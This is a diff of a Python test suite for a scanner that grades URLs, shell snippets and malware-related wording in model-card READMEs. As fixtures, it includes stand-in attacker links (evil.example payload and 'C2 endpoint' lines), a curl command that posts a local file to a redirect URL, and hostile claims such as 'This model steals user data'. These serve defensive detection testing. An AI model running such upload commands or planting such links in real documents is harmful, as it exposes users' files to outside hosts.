+    assert TextScanner._documentation_open_call_context_status(content, content.index(b"https://")) is None
+    assert TextScanner._documentation_open_call_prefix_status.cache_info().currsize == 0
+
+
+def test_text_scanner_call_context_limit_is_inconclusive_and_not_cached(tmp_path: Path) -> None:
+    path = tmp_path / "README.md"
+    path.write_text("download(\n" + "''\nIt's (a)\n" * 256 + "[payload](https://evil.example/payload.sh)\n")
+    result = TextScanner(config={"check_secrets": False}).scan(str(path))
+    assert result.success is False
+    assert result.metadata.get("scan_outcome") == INCONCLUSIVE_SCAN_OUTCOME
+    assert result.metadata.get("operational_error_reason") == "text_content_security_classification_limit"
+    assert any(
+        check.name == "Text Content Security Coverage"
+        and check.message == "Text network finding classification exceeded the work limit"
+        and check.details.get("classification_limit_sources") == ["documentation_call_context"]
+        and check.details.get("max_documentation_call_parse_bytes")
+        == text_scanner_module.MAX_DOCUMENTATION_CALL_PARSE_BYTES
+        and check.details.get("max_documentation_total_call_parse_bytes")
+        == text_scanner_module.MAX_DOCUMENTATION_TOTAL_CALL_PARSE_BYTES
+        for check in result.checks
+    )
+    assert any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)
+    cache_dir = tmp_path / "cache"
+    with IsolatedCacheManager(reset_cache_manager):
+        for _ in range(2):
+            aggregate = scan_model_directory_or_file(
+                str(path), cache_enabled=True, cache_dir=str(cache_dir), min_cache_file_size=0, check_secrets=False
+            )
+            assert aggregate.success is False
+            assert determine_exit_code(aggregate) == 2
+        assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] == 0
+
+
+def test_text_scanner_call_context_limit_does_not_reclassify_cc_findings(tmp_path: Path) -> None:
+    path = tmp_path / "README.md"
+    path.write_text("''\nIt's (a)\n" * 256 + "This model installs a backdoor payload.\n")
+
+    result = TextScanner(config={"check_secrets": False}).scan(str(path))
+    assert result.success is False
+    assert not result.metadata.get("analysis_incomplete")
+    assert any(
+        check.details.get("type") == "cc_pattern"
+        and check.details.get("pattern") == "backdoor"
+        and check.status == CheckStatus.FAILED
+        and check.severity == IssueSeverity.CRITICAL
+        for check in result.checks
+    )
+    assert any(
+        check.name == "Text Content Security Coverage" and check.status == CheckStatus.PASSED for check in result.checks
+    )
+
+    aggregate = scan_model_directory_or_file(str(path), cache_enabled=False, check_secrets=False)
+    assert aggregate.success is True
+    assert determine_exit_code(aggregate) == 1
+
+
+def test_text_scanner_completed_fence_bounds_dense_call_context(tmp_path: Path) -> None:
+    _assert_documentation_informational(
+        tmp_path,
+        "```python\ndownload(\n" + "'',\n" * 128 + ")\n```\n[guide](https://docs.example.com/reference)\n",
+    )
+
+
+def test_documentation_total_call_budget_does_not_cache_incomplete_results() -> None:
+    content = b"''\nIt's (a)\n[guide](https://docs.example.com/reference)\n"
+    position = content.index(b"https://")
+    TextScanner._documentation_open_call_prefix_status.cache_clear()
+    token = text_scanner_module._DOCUMENTATION_CALL_BUDGET.set(0)
+    try:
+        assert TextScanner._documentation_open_call_context_status(content, position) is None
+        assert TextScanner._documentation_open_call_prefix_status.cache_info().currsize == 0
+    finally:
+        text_scanner_module._DOCUMENTATION_CALL_BUDGET.reset(token)
+    assert TextScanner._documentation_open_call_context_status(content, position) is False
+    TextScanner._documentation_open_call_prefix_status.cache_clear()
+
+
+def test_text_scanner_total_call_budget_is_scoped_to_each_scan(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
+    path = tmp_path / "README.md"
+    path.write_text("''\nIt's (a)\n[guide](https://docs.example.com/reference)\n")
+    TextScanner._documentation_open_call_prefix_status.cache_clear()
+    with monkeypatch.context() as limited:
+        limited.setattr(text_scanner_module, "MAX_DOCUMENTATION_TOTAL_CALL_PARSE_BYTES", 0)
+        result = TextScanner().scan(str(path))
+        assert result.success is False
+        assert result.metadata.get("scan_outcome") == INCONCLUSIVE_SCAN_OUTCOME
+        assert any(
+            check.details.get("classification_limit_sources") == ["documentation_call_context"]
+            and check.details.get("max_documentation_total_call_parse_bytes") == 0
+            for check in result.checks
+        )
+    assert text_scanner_module._DOCUMENTATION_CALL_BUDGET.get() is None
+    result = TextScanner().scan(str(path))
+    assert result.success is True
+    assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)
+    TextScanner._documentation_open_call_prefix_status.cache_clear()
+
+
+def test_documentation_call_parser_caches_results_without_caching_budget_failures() -> None:
+    prefix = b"source (context) "
+    other_prefix = b"another (context) "
+    TextScanner._documentation_cached_call_prefix.cache_clear()
+    budget_token = text_scanner_module._DOCUMENTATION_CALL_BUDGET.set(len(prefix))
+    try:
+        assert TextScanner._documentation_prefix_has_enclosing_call(prefix) is False
+        assert text_scanner_module._DOCUMENTATION_CALL_BUDGET.get() == 0
+        assert TextScanner._documentation_prefix_has_enclosing_call(prefix) is False
+        with pytest.raises(text_scanner_module._DocumentationCallBudgetExceeded):
+            TextScanner._documentation_prefix_has_enclosing_call(other_prefix)
+        assert TextScanner._documentation_cached_call_prefix.cache_info().currsize == 1
+        text_scanner_module._DOCUMENTATION_CALL_BUDGET.set(len(other_prefix))
+        assert TextScanner._documentation_prefix_has_enclosing_call(other_prefix) is False
+        assert text_scanner_module._DOCUMENTATION_CALL_BUDGET.get() == 0
+    finally:
+        text_scanner_module._DOCUMENTATION_CALL_BUDGET.reset(budget_token)
+        TextScanner._documentation_cached_call_prefix.cache_clear()
+
+
+def test_documentation_call_parser_does_not_cache_oversized_prefixes() -> None:
+    prefix = b"source " + b" " * text_scanner_module.MAX_DOCUMENTATION_CALL_PARSE_BYTES + b"(context)"
+    TextScanner._documentation_cached_call_prefix.cache_clear()
+    assert TextScanner._documentation_prefix_has_enclosing_call(prefix) is False
+    assert TextScanner._documentation_cached_call_prefix.cache_info().currsize == 0
+
+
+@pytest.mark.parametrize(
+    ("content", "completed_exit_code"),
+    [
+        ("source (context) [guide](https://docs.example.com/reference)\n", 0),
+        ("source (context) mentions import urllib.\n\nimport urllib\n", 1),
+    ],
+)
+def test_text_scanner_same_line_call_limit_is_inconclusive_and_not_cached(
+    tmp_path: Path, monkeypatch: pytest.MonkeyPatch, content: str, completed_exit_code: int
+) -> None:
+    path = tmp_path / "README.md"
+    path.write_text(content)
+    TextScanner._documentation_cached_call_prefix.cache_clear()
+    cache_dir = tmp_path / "cache"
+    with monkeypatch.context() as limited, IsolatedCacheManager(reset_cache_manager):
+        limited.setattr(text_scanner_module, "MAX_DOCUMENTATION_TOTAL_CALL_PARSE_BYTES", 0)
+        result = TextScanner(config={"check_secrets": False}).scan(str(path))
+        assert result.metadata.get("scan_outcome") == INCONCLUSIVE_SCAN_OUTCOME
+        assert any(
+            check.name == "Text Content Security Coverage"
+            and check.details.get("classification_limit_sources") == ["documentation_call_context"]
+            for check in result.checks
+        )
+        assert any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)
+        for _ in range(2):
+            aggregate = scan_model_directory_or_file(
+                str(path), cache_enabled=True, cache_dir=str(cache_dir), min_cache_file_size=0, check_secrets=False
+            )
+            assert aggregate.success is False
+            assert determine_exit_code(aggregate) == 2
+        assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] == 0
+    assert text_scanner_module._DOCUMENTATION_CALL_BUDGET.get() is None
+    aggregate = scan_model_directory_or_file(str(path), cache_enabled=False, check_secrets=False)
+    assert aggregate.success is True
+    assert determine_exit_code(aggregate) == completed_exit_code
+    TextScanner._documentation_cached_call_prefix.cache_clear()
 
 
 @pytest.mark.parametrize(
@@ -2538,6 +3338,7 @@ def test_text_scanner_model_card_dedup_bounds_repeated_documentation_links(tmp_p
         "lambda docs: https://example.com/functions\n",
         "Webhook documentation: https://docs.example.com/webhooks\n",
         "C2 research: https://example.com/security\n",
+        "- Command line interface: https://example.com/project#usage\n",
         "config = {}  # docs: https://example.com/configuration\n",
         "[Documentation](https://example.com/reference)\n",
         "![Model diagram](https://example.com/model.png)\n",
@@ -3341,6 +4142,8 @@ def test_text_scanner_documentation_lambda_url_remains_actionable(tmp_path: Path
     [
         "webhook: https://evil.example/payload\n",
         "C2 endpoint: https://evil.example/payload\n",
+        "Command-line interface endpoint: https://evil.example/payload\n",
+        "Endpoint for the command-line interface: https://evil.example/payload\n",
         "command and control server URL: https://evil.example/payload\n",
     ],
 )
@@ -3505,6 +4308,736 @@ def test_text_scanner_documentation_benign_cc_prose_is_informational(tmp_path: P
     assert {check.details.get("pattern") for check in cc_checks} == {"malware", "backdoor", "botnet"}
     assert all(check.severity == IssueSeverity.INFO for check in cc_checks)
     assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)
+
+
+@pytest.mark.parametrize(
+    ("content", "pattern"),
+    [
+        ("1. **Kill zombie GPU procs** — a failed launch leaves workers in memory.", "zombie"),
+        ("Reap zombie processes after the worker exits.", "zombie"),
+        ("- Not a safety classifier - does not detect phishing or malware", "malware"),
+    ],
+)
+def test_text_scanner_system_maintenance_and_classifier_limitations_are_informational(
+    tmp_path: Path, content: str, pattern: str
+) -> None:
+    result = _scan_text_content(tmp_path / "README.md", content)
+    checks = [check for check in result.checks if check.details.get("pattern") == pattern]
+    assert checks and all(check.severity == IssueSeverity.INFO for check in checks)
+
+
+@pytest.mark.parametrize(
+    "content",
+    [
+        "Kill zombie hosts after they execute the payload.",
+        "Reap zombie processes. This model runs zombie workers for its botnet.",
+        '~~~python\nclassify("""\n\nIt does not detect phishing or malware\n""")\n~~~\n',
+        '~~~python\nclassify("""\n\nReap zombie processes.\n""")\n~~~\n',
+        "This model does not detect phishing and installs malware.",
+        "This model does not detect phishing or malware. It installs malware.",
+        "This model does not detect phishing or malware.\nThis model executes it during loading.",
+    ],
+)
+def test_text_scanner_classifier_and_process_prose_preserves_actionable_occurrences(
+    tmp_path: Path, content: str
+) -> None:
+    _assert_documentation_network_actionable(tmp_path, content, "cc_pattern")
+
+
+@pytest.mark.parametrize(
+    "card",
+    [
+        """---
+extra_gated_prompt: >-
+  #### Prohibited Uses
+
+  You agree you will not use, or allow others to use, the package to:
+    1. Violate the following restrictions:
+       2. Create, generate, or facilitate the creation of malicious code, malware, or computer viruses.
+---
+""",
+        r"""---
+extra_gated_prompt: "Usage agreement for the \"Package\".\n\
+  #### Prohibited Uses\nYou agree you will not use, or allow others to use, the package to:\n\
+  1. Violate the following restrictions:\n    2. Create, generate, or facilitate the creation\
+  \ of malicious code, malware, or computer viruses."
+---
+""",
+        "---\nextra_gated_prompt: |\n  ## Prohibited Uses\n  1. Do not generate malware.\n---\n",
+    ],
+    ids=["folded", "double-quoted", "direct-prohibition"],
+)
+def test_gating_policy_prohibition_keeps_malware_literal_informational(tmp_path: Path, card: str) -> None:
+    path = tmp_path / "README.md"
+    path.write_bytes(card.encode())
+    checks = _failed_network_detection_checks(TextScanner().scan(str(path)))
+    assert any(
+        check.details.get("pattern") == "malware"
+        and check.details.get("position") == card.encode().index(b"malware")
+        and check.severity == IssueSeverity.INFO
+        for check in checks
+    )
+    assert determine_exit_code(scan_model_directory_or_file(str(path), cache_enabled=False)) == 0
+
+
+@pytest.mark.parametrize(
+    "content",
+    [
+        "### Prohibited Uses\n1. Create, generate, or facilitate the creation of malicious code, malware, or viruses.",
+        '''---
+extra_gated_prompt: |
+  ## Prohibited Uses
+  You will not use the model to:
+  classify("""
+    1. Create malware
+  """)
+---
+''',
+        """---
+extra_gated_prompt: >-
+  #### Prohibited Uses
+  You agree you will not use, or allow others to use, this model to:
+    1. Create, generate, or facilitate the creation of malicious code, malware, or viruses.
+---
+This model installs malware during initialization.
+""",
+    ],
+)
+def test_gating_policy_prohibition_requires_context_and_preserves_active_claim(tmp_path: Path, content: str) -> None:
+    path = tmp_path / "README.md"
+    path.write_bytes(content.encode())
+    assert any(
+        check.details.get("pattern") == "malware"
+        and check.details.get("position") == content.encode().rindex(b"malware")
+        and check.severity == IssueSeverity.CRITICAL
+        for check in _failed_network_detection_checks(TextScanner().scan(str(path)))
+    )
+
+
+def _escaped_gating_policy(terms: str) -> str:
+    continuation = "  The license applies to this project.\\\n"
+    repeats = MAX_TEXT_FINDING_CONTEXT_BYTES // len(continuation) + 1
+    return '---\nextra_gated_prompt: "Terms\\\n' + continuation * repeats + terms + '"\n---\n'
+
+
+@pytest.mark.parametrize(
+    "policy_reference",
+    [
+        "The most recent copy of this policy can be found at [https://publisher.dev/terms](https://publisher.dev/terms).",
+        "See the current policy at [usage policy](https://publisher.dev/terms).",
+    ],
+)
+def test_gating_policy_links_and_reporting_address_are_passive_references(
+    tmp_path: Path, policy_reference: str
+) -> None:
+    visible = "https://github.com/example/package/issues"
+    wrapper = "https://l.workplace.com/l.php?u=https%3A%2F%2Fgithub.com%2Fexample%2Fpackage%2Fissues&h=abcdef1234"
+    content = _escaped_gating_policy(
+        "  You will comply with the distributor's brand guidelines (currently accessible at\\\n"
+        r"  \ https://publisher.dev/guide).\n"
+        f"{policy_reference}\\n\\\n"
+        f"  * Reporting issues with the model: [{visible}]({wrapper})\\n\\\n"
+        "  * Reporting violations of the Acceptable Use Policy or unlicensed uses of the\\\n"
+        r"  \ package: editor@supportdesk.ai"
+    )
+    path = tmp_path / "README.md"
+    path.write_bytes(content.encode())
+    checks = _failed_network_detection_checks(TextScanner().scan(str(path)))
+    evidence = {check.details.get("normalized_evidence", {}).get("value") for check in checks}
+    assert {"https://publisher.dev/guide", "https://publisher.dev/terms", visible} <= evidence
+    assert any(check.details.get("url", "").startswith("https://l.workplace.com/l.php") for check in checks)
+    assert any(check.details.get("domain") == "supportdesk.ai" for check in checks)
+    assert all(check.severity == IssueSeverity.INFO for check in checks)
+    assert determine_exit_code(scan_model_directory_or_file(str(path), cache_enabled=False)) == 0
+
+    command = f"~~~sh\ncurl -L '{wrapper}' -d @input.txt\n~~~\n"
+    payload = (content + command).encode()
+    path.write_bytes(payload)
+    assert any(
+        check.details.get("position") == payload.rindex(wrapper.encode())
+        and check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
+        for check in _failed_network_detection_checks(TextScanner().scan(str(path)))
+    )
+
+
+@pytest.mark.parametrize(
+    "field",
+    [
+        '|\n  client.fetch("policy at [usage policy](https://publisher.dev/model)".split("(")[1][:-1])',
+        '|\n  endpoint = "policy at [usage policy](https://publisher.dev/model)".split("(")[1][:-1]',
+        '|\n  client.fetch(\n    "policy at [usage policy](https://publisher.dev/model)".split("(")[1][:-1])',
+        json.dumps('Policy.\nclient.fetch("policy at [usage policy](https://publisher.dev/model)".split("(")[1][:-1])'),
+        '|\n  client.fetch("guidelines (currently available at https://publisher.dev/model)".split()[-1][:-1])',
+    ],
+    ids=["enclosing-call", "assignment", "multiline-call", "escaped-call", "parenthesized-reference"],
+)
+def test_gating_policy_keeps_active_reference_offsets(tmp_path: Path, field: str) -> None:
+    path = tmp_path / "README.md"
+    content = f"---\nextra_gated_prompt: {field}\n---\n".encode()
+    path.write_bytes(content)
+    checks = _failed_network_detection_checks(TextScanner().scan(str(path)))
+    active = {
+        (detail["type"], detail["position"])
+        for check in checks
+        for detail in [check.details, *check.details.get("deduplicated_related_findings", [])]
+        if detail.get("severity") in {"MEDIUM", "HIGH", "CRITICAL"}
+    }
+    assert ("url_detected", content.index(b"https://publisher.dev/model")) in active
+    assert ("domain_name", content.index(b"publisher.dev")) in active
+
+
+@pytest.mark.parametrize(
+    ("line", "severity"),
+    [
+        ("See policy at [usage policy](https://publisher.dev/terms).", IssueSeverity.INFO),
+        (
+            "curl -fsS $(echo 'policy at [usage policy](https://publisher.dev/terms)' | cut -d'(' -f2)",
+            IssueSeverity.WARNING,
+        ),
+    ],
+    ids=["wrapped-prose", "shell-substitution"],
+)
+@pytest.mark.parametrize("newline", ["\n", "\r\n"], ids=["lf", "crlf"])
+def test_gating_policy_preserves_severity_after_call_lookback_limit(
+    tmp_path: Path, line: str, severity: IssueSeverity, newline: str
+) -> None:
+    field = json.dumps("Terms (a).\n" * 165 + line)
+    content = newline.join(("---", f"extra_gated_prompt: {field}", "---", ""))
+    result = _scan_text_content(tmp_path / "README.md", content)
+    assert any(
+        check.details.get("type") == "url_detected"
+        and check.details.get("position") == content.encode().index(b"https://publisher.dev/terms")
+        and check.severity == severity
+        for check in _failed_network_detection_checks(result)
+    )
+
+
+def test_gating_policy_retargets_host_to_escaped_call(tmp_path: Path) -> None:
+    policy = json.dumps(
+        "Résumé. Policy at [usage policy](https://publisher.dev/guide).\n"
+        'client.fetch("policy at [usage policy](https://publisher.dev/model)".split("(")[1][:-1])',
+        ensure_ascii=False,
+    )
+    content = f"---\nextra_gated_prompt: {policy}\n---\n"
+    result = _scan_text_content(tmp_path / "README.md", content)
+    findings = {
+        (check.details.get("type"), check.details.get("position")): check.severity
+        for check in _failed_network_detection_checks(result)
+    }
+    raw = content.encode()
+    assert findings["url_detected", raw.index(b"https://publisher.dev/guide")] == IssueSeverity.INFO
+    assert findings["url_detected", raw.index(b"https://publisher.dev/model")] == IssueSeverity.WARNING
+    assert findings["domain_name", raw.rindex(b"publisher.dev")] == IssueSeverity.WARNING
+
+
+@pytest.mark.parametrize(
+    ("report", "target"),
+    [
+        ("* Support contact: support@publisher.dev", "publisher.dev"),
+        ("* Reporting issues: [usage policy](https://publisher.dev/terms)", "https://publisher.dev/terms"),
+    ],
+)
+def test_gating_policy_reporting_bullets_in_call_arguments_stay_actionable(
+    tmp_path: Path, report: str, target: str
+) -> None:
+    content = f'---\nextra_gated_prompt: |\n  fetch("""\n    {report}\n  """)\n---\n'
+    result = _scan_text_content(tmp_path / "README.md", content)
+    assert any(
+        check.details.get("position") == content.encode().index(target.encode())
+        and check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
+        for check in _failed_network_detection_checks(result)
+    )
+
+
+def test_gating_policy_reports_multiline_feedback_and_security_references(tmp_path: Path) -> None:
+    content = (
+        b"---\nextra_gated_prompt: >-\n  See the project.cpp(#239) release.\n"
+        b"  * Reporting risky content generated by the model:\n    feedback.publisher.dev/model_feedback\n"
+        b"  * Reporting bugs and security concerns: [security.publisher.dev/report]"
+        b"(https://security.publisher.dev/report)\n"
+        b"---\n"
+    )
+    path = tmp_path / "README.md"
+    path.write_bytes(content)
+    checks = _failed_network_detection_checks(TextScanner().scan(str(path)))
+    assert any(check.details.get("domain") == "feedback.publisher.dev" for check in checks)
+    assert any(check.details.get("url", "").startswith("https://security.publisher.dev/report") for check in checks)
+    assert all(check.severity == IssueSeverity.INFO for check in checks)
+    content += b"~~~sh\ncurl feedback.publisher.dev\n~~~\n"
+    path.write_bytes(content)
+    assert any(
+        check.details.get("domain") == "feedback.publisher.dev"
+        and check.details.get("position") == content.rindex(b"feedback.publisher.dev")
+        and check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
+        for check in _failed_network_detection_checks(TextScanner().scan(str(path)))
+    )
+
+
+@pytest.mark.parametrize(
+    ("label", "wrapper", "evidence"),
+    [
+        (
+            "https://github.com/example/package/issues",
+            "https://relay.dev/r?u=https%3A%2F%2Fgithub.com%2Fexample%2Fpackage%2Fissues",
+            "https://relay.dev/r",
+        ),
+        (
+            "https://github.com/example/package/issues",
+            "https://l.workplace.com/l.php?u=https%3A%2F%2Fcallback.dev%2Fcollect&h=abc123",
+            "https://l.workplace.com/l.php",
+        ),
+        (
+            "https://github.com/example/package/issues",
+            "https://l.workplace.com/l.php?u=https%3A%2F%2Fgithub.com%2Fexample%2Fpackage%2Fissues&next=custom",
+            "https://l.workplace.com/l.php",
+        ),
+        ("security.publisher.dev/report", "https://callback.dev/collect", "security.publisher.dev"),
+    ],
+    ids=["unknown-wrapper", "mismatched-destination", "extra-parameter", "mismatched-visible-host"],
+)
+def test_gating_policy_preserves_unverified_reporting_destinations(
+    tmp_path: Path, label: str, wrapper: str, evidence: str
+) -> None:
+    content = _escaped_gating_policy(f"  * Reporting issues with the model: [{label}]({wrapper})")
+    result = _scan_text_content(tmp_path / "README.md", content)
+    assert any(
+        check.details.get("normalized_evidence", {}).get("value") == evidence
+        and check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
+        for check in _failed_network_detection_checks(result)
+    )
+
+
+@pytest.mark.parametrize(
+    ("credit", "reference"),
+    [
+        ("Quantized and validated by **Sample Team** — maintainer@publisher.dev", "publisher.dev"),
+        ("Converted by **Sample Team** — maintainer@publisher.dev", "publisher.dev"),
+        ("Converted by **Team #1** — maintainer@publisher.dev", "publisher.dev"),
+        (
+            "AWQ quantization: done by lab in INT4 GEMM with Toolkit by dev-team (https://github.com/dev-team/toolkit/)",
+            "https://github.com/dev-team/toolkit/",
+        ),
+    ],
+)
+def test_model_card_byline_preserves_documented_post_and_later_shell_destination(
+    tmp_path: Path, credit: str, reference: str
+) -> None:
+    content = (
+        "~~~bash\ncurl http://127.0.0.1:8080/v1/chat -d '{}'\n~~~\n\n"
+        "Use package.cpp(#935) before continuing.\n\n"
+        f"{credit}\n"
+    ).encode()
+    path = tmp_path / "README.md"
+    path.write_bytes(content)
+    checks = _failed_network_detection_checks(TextScanner().scan(str(path)))
+    assert any(
+        check.details.get("position") == content.index(reference.encode())
+        and check.details.get("type") in {"url_detected", "domain_name"}
+        and check.severity == IssueSeverity.INFO
+        for check in checks
+    )
+    assert any(
+        check.details.get("position") == content.index(b"http://127.0.0.1")
+        and check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
+        for check in checks
+    )
+    content += f"\n~~~sh\ncurl {reference}\n~~~\n".encode()
+    path.write_bytes(content)
+    checks = _failed_network_detection_checks(TextScanner().scan(str(path)))
+    assert any(
+        check.details.get("type") in {"url_detected", "domain_name"}
+        and check.details.get("position") == content.rindex(reference.encode())
+        and check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
+        for check in checks
+    )
+
+
+@pytest.mark.parametrize(
+    ("credit", "reference"),
+    [
+        ("Converted by **Sample Team** - maintainer@publisher.dev", "publisher.dev"),
+        ("Converted by **Team #1** - maintainer@publisher.dev", "publisher.dev"),
+        (
+            "Conversion: done by lab with Toolkit (https://github.com/dev-team/toolkit/)",
+            "https://github.com/dev-team/toolkit/",
+        ),
+    ],
+)
+def test_model_card_byline_inside_multiline_call_keeps_warning(tmp_path: Path, credit: str, reference: str) -> None:
+    content = f'~~~python\nfetch("""\n\n{credit}\n""".split()[-1])\n~~~\n'
+    result = _scan_text_content(tmp_path / "README.md", content)
+    assert any(
+        check.details.get("position") == content.index(reference)
+        and check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
+        for check in _failed_network_detection_checks(result)
+    )
+
+
+def test_model_card_repeated_domain_in_active_credit_keeps_later_offset(tmp_path: Path) -> None:
+    content = (
+        "See publisher.dev for information.\n\n"
+        '~~~python\nfetch("""\n\n'
+        "Converted by **Sample Team** - maintainer@publisher.dev\n"
+        '""".split("@")[1].strip())\n~~~\n'
+    )
+    result = _scan_text_content(tmp_path / "README.md", content)
+    assert any(
+        check.details.get("type") == "domain_name"
+        and check.details.get("position") == content.rindex("publisher.dev")
+        and check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
+        for check in _failed_network_detection_checks(result)
+    )
+
+
+def test_text_scanner_documentation_possible_misuse_is_informational(tmp_path: Path) -> None:
+    result = _scan_text_content(
+        tmp_path / "README.md", "* **Misuse:** Malware production may be possible; review generated outputs.\n"
+    )
+
+    checks = [check for check in result.checks if check.details.get("pattern") == "malware"]
+    assert checks and all(check.severity == IssueSeverity.INFO for check in checks)
+    assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)
+
+
+@pytest.mark.parametrize(
+    "suffix",
+    [" and is enabled by default.", "; it is enabled by default.", ". This capability is enabled by default."],
+)
+def test_text_scanner_generic_misuse_capability_is_informational(tmp_path: Path, suffix: str) -> None:
+    result = _scan_text_content(tmp_path / "README.md", "Malware production may be possible" + suffix + "\n")
+    checks = [check for check in result.checks if check.details.get("pattern") == "malware"]
+    assert checks and all(check.severity == IssueSeverity.INFO for check in checks)
+
+
+@pytest.mark.parametrize("newline", ["\n", "\r\n", "\n\n", "\r\n\r\n"])
+@pytest.mark.parametrize(
+    "continuation",
+    [
+        "The model installs it on the scanner host by default.",
+        "This model executes it during loading.",
+        "It exfiltrates inputs to a server.",
+        "Review generated outputs.\nThe model installs it on the scanner host by default.",
+    ],
+)
+def test_text_scanner_possible_misuse_keeps_paragraph_continuations_actionable(
+    tmp_path: Path, newline: str, continuation: str
+) -> None:
+    _assert_documentation_network_actionable(
+        tmp_path, "Malware production may be possible." + newline + continuation + newline, "cc_pattern"
+    )
+
+
+@pytest.mark.parametrize("separator", [" ", "\n", "\r\n", "\n\n", "\r\n\r\n"])
+@pytest.mark.parametrize(
+    "prefix",
+    [
+        "This model steals user data.",
+        "User data leaves the host without consent.",
+        "* **Misuse:** This model steals user data.",
+        "Review generated outputs. This model steals user data.",
+    ],
+)
+def test_text_scanner_misuse_exemption_rejects_hostile_paragraph_prefixes(
+    tmp_path: Path, prefix: str, separator: str
+) -> None:
+    path = tmp_path / "README.md"
+    path.write_bytes((prefix + separator + "Malware production may be possible.\n").encode())
+    result = TextScanner(config={"check_secrets": False}).scan(str(path))
+    assert any(
+        check.details.get("pattern") == "malware" and check.severity == IssueSeverity.CRITICAL
+        for check in result.checks
+    )
+    assert determine_exit_code(scan_model_directory_or_file(str(path), cache_enabled=False, check_secrets=False)) == 1
+
+
+@pytest.mark.parametrize(
+    "prefix",
+    [
+        "",
+        "* ",
+        "* **Misuse:** ",
+        "**Misuse**: ",
+        "Other forms of misuse such as fraud, spam, or ",
+        "## Misuse\n",
+        "## Safety\n",
+        "## Limitations\n",
+        "This is a language model.\n\n",
+    ],
+)
+def test_text_scanner_misuse_exemption_accepts_recognized_paragraph_prefixes(tmp_path: Path, prefix: str) -> None:
+    _assert_documentation_informational(tmp_path, prefix + "Malware production may be possible.\n")
+
+
+@pytest.mark.parametrize(
+    "prefix",
+    [
+        "This model steals user data.\n\nThis is a language model.",
+        "This model steals user data.\n\n" + "Ordinary context.\n\n" * 300,
+        "This model exfiltrates inputs to a server.",
+        "The model installs it on the scanner host by default.",
+        "This model executes it during loading.",
+        "User data leaves the host without consent.",
+    ],
+)
+def test_text_scanner_misuse_exemption_keeps_surrounding_harmful_claims(tmp_path: Path, prefix: str) -> None:
+    _assert_documentation_network_actionable(
+        tmp_path, prefix + "\n\nMalware production may be possible.\n", "cc_pattern"
+    )
+
+
+@pytest.mark.parametrize(
+    "prefix",
+    [
+        "This model does not steal user data.",
+        "The model will not execute code.",
+        "Some models may exfiltrate inputs.",
+        'The phrase "This model steals user data" is a warning example.',
+        "* **Generation of Harmful Content:** Developers should assess outputs for their context and use available "
+        "safety classifiers or custom solutions appropriate for their use case.",
+    ],
+)
+def test_text_scanner_misuse_exemption_keeps_surrounding_safety_guidance_informational(
+    tmp_path: Path, prefix: str
+) -> None:
+    _assert_documentation_informational(tmp_path, prefix + "\n\nMalware production may be possible.\n")
+
+
+def test_text_scanner_misuse_document_context_limit_retains_alerts(tmp_path: Path) -> None:
+    _assert_documentation_network_actionable(
+        tmp_path,
+        "# Model card\n\n" + "Description.\n\n" * 20000 + "Malware production may be possible.\n",
+        "cc_pattern",
+    )
+
+
+def test_text_scanner_misuse_exemption_rejects_truncated_paragraph_prefix(tmp_path: Path) -> None:
+    _assert_documentation_network_actionable(
+        tmp_path,
+        "This model steals user data. "
+        + "x" * (MAX_TEXT_FINDING_CONTEXT_BYTES + 1)
+        + "\nMalware production may be possible.\n",
+        "cc_pattern",
+    )
+
+
+@pytest.mark.parametrize(
+    "continuation",
+    [
+        "This model steals user data by default.",
+        "User data leaves the host without consent.",
+        "It makes unauthorized copies of private files.",
+        "## Usage\n\nThis model steals user data by default.",
+        "Review generated outputs.\n\nThis model steals user data by default.",
+        " " * (MAX_TEXT_FINDING_CONTEXT_BYTES + 1) + "This model steals user data.",
+    ],
+)
+def test_text_scanner_misuse_exemption_rejects_unrecognized_continuations(tmp_path: Path, continuation: str) -> None:
+    _assert_documentation_network_actionable(
+        tmp_path, "Malware production may be possible.\n\n" + continuation + "\n", "cc_pattern"
+    )
+
+
+@pytest.mark.parametrize(
+    "continuation",
+    ["This capability is enabled by default.", "The model does not install it.", "It will not execute anything."],
+)
+def test_text_scanner_generic_misuse_capability_across_paragraphs_is_informational(
+    tmp_path: Path, continuation: str
+) -> None:
+    result = _scan_text_content(tmp_path / "README.md", "Malware production may be possible.\n\n" + continuation + "\n")
+    checks = [check for check in result.checks if check.details.get("pattern") == "malware"]
+    assert checks and all(check.severity == IssueSeverity.INFO for check in checks)
+
+
+@pytest.mark.parametrize("newline", ["\n", "\r\n"])
+def test_text_scanner_wrapped_misuse_guidance_is_informational(tmp_path: Path, newline: str) -> None:
+    text_path = tmp_path / "README.md"
+    text_path.write_bytes(
+        (
+            f"Malware production may be possible,{newline}and developers should ensure that their applications "
+            f"do not violate applicable laws and regulations.{newline}{newline}## Usage{newline}"
+        ).encode()
+    )
+    result = TextScanner().scan(str(text_path))
+    checks = [check for check in result.checks if check.details.get("pattern") == "malware"]
+    assert checks and all(check.severity == IssueSeverity.INFO for check in checks)
+
+
+def test_text_scanner_possible_misuse_with_compliance_guidance_is_informational(tmp_path: Path) -> None:
+    result = _scan_text_content(
+        tmp_path / "README.md",
+        "* **Misuse:** Other forms of misuse such as fraud, spam, or malware production may be possible, "
+        "and developers should ensure that their applications do not violate applicable laws and regulations.\n",
+    )
+    checks = [check for check in result.checks if check.details.get("pattern") == "malware"]
+    assert checks and all(check.severity == IssueSeverity.INFO for check in checks)
+
+
+@pytest.mark.parametrize(
+    "content",
+    [
+        'label = "malware production may be possible"\n',
+        "Malware production may be possible.\nThis model installs malware.\n",
+    ],
+)
